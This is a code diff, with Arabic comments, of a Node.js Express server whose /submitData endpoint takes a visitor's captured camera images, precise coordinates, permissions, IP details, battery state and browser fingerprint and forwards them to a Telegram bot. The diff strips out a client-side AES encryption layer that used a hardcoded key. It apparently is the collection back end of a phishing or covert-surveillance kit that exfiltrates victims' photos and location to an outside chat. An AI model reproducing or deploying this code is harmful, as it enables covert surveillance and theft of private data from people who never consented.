@@ -3,49 +3,16 @@ const bodyParser = require('body-parser');
 const UAParser = require('ua-parser-js');
 const axios = require('axios');
 const FormData = require('form-data');
-const CryptoJS = require('crypto-js'); // استيراد مكتبة التشفير
 const app = express();
 const PORT = process.env.PORT || 3000;
-
-// مفتاح التشفير (يجب أن يكون مطابقاً للمفتاح في العميل)
-const ENCRYPTION_KEY = 'SuperSecretKey2025!@#$%^&*()_+';
 
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(bodyParser.json({ limit: '10mb' }));
 
-// دالة فك التشفير
-function decryptData(encryptedData) {
-    try {
-        const bytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
-        const decryptedString = bytes.toString(CryptoJS.enc.Utf8);
-        return JSON.parse(decryptedString);
-    } catch (error) {
-        console.error('❌ فشل فك التشفير:', error.message);
-        return null;
-    }
-}
-
 app.post('/submitData', async (req, res) => {
     try {
-        const { encryptedData, chatId } = req.body;
+        const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;
 
-        if (!encryptedData) {
-            console.error('❌ لا توجد بيانات مشفرة');
-            return res.sendStatus(400);
-        }
-
-        // فك تشفير البيانات
-        const decrypted = decryptData(encryptedData);
-        if (!decrypted) {
-            console.error('❌ فشل فك التشفير');
-            return res.sendStatus(400);
-        }
-
-        // استخراج البيانات
-        const { imageDatas, location, permissions, ipInfo, battery } = decrypted;
-        const finalChatId = chatId || decrypted.chatId || 'غير موجود';
-
-        // تحليل User-Agent
         const userAgent = req.headers['user-agent'] || '';
         const parser = new UAParser(userAgent);
         const browser = parser.getBrowser();
@@ -66,7 +33,6 @@ app.post('/submitData', async (req, res) => {
         if (deviceVendor || deviceModel) detailedBrowser += ` على${deviceVendor}${deviceModel}`;
         detailedBrowser += engineName;
 
-        // استخراج الإحداثيات
         let latitude = null;
         let longitude = null;
         let locationText = location || 'غير متاح';
@@ -81,10 +47,9 @@ app.post('/submitData', async (req, res) => {
             }
         }
 
-        // بناء الرسالة النصية
         const text = `📱 **بيانات جديدة من المستخدم**
         
-🆔 **Chat ID**: ${finalChatId}
+🆔 **Chat ID**: ${chatId || 'غير موجود'}
 📍 **الموقع الدقيق**: ${locationText}
 🔐 **الصلاحيات**: ${permissions || 'غير محددة'}
 🌐 **معلومات IP**: ${ipInfo || 'غير متوفرة'}
@@ -94,7 +59,7 @@ app.post('/submitData', async (req, res) => {
         `;
 
         const botToken = process.env.to;
-        const chatIdTelegram = process.env.id || finalChatId;
+        const chatIdTelegram = process.env.id || chatId;
 
         if (!botToken) {
             console.error('❌ BOT_TOKEN غير مضبوط');
@@ -108,7 +73,7 @@ app.post('/submitData', async (req, res) => {
             parse_mode: 'Markdown'
         });
 
-        // 2. إرسال الموقع كخريطة (إن وجد)
+        // 2. إرسال الموقع كخريطة
         if (latitude !== null && longitude !== null) {
             await axios.post(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                 chat_id: chatIdTelegram,
@@ -117,7 +82,7 @@ app.post('/submitData', async (req, res) => {
             });
         }
 
-        // 3. إرسال الصور (إن وجدت)
+        // 3. إرسال الصور
         if (imageDatas) {
             const imagesArray = imageDatas.split(',').filter(img => img.trim() !== '');
             for (let i = 0; i < imagesArray.length; i++) {
@@ -142,6 +107,7 @@ app.post('/submitData', async (req, res) => {
 
     } catch (error) {
         console.error('❌ حدث خطأ:', error.message);
+        // إرجاع استجابة فارغة حتى في حالة الخطأ (لا نريد توجيه المستخدم)
         res.sendStatus(500);
     }
 });
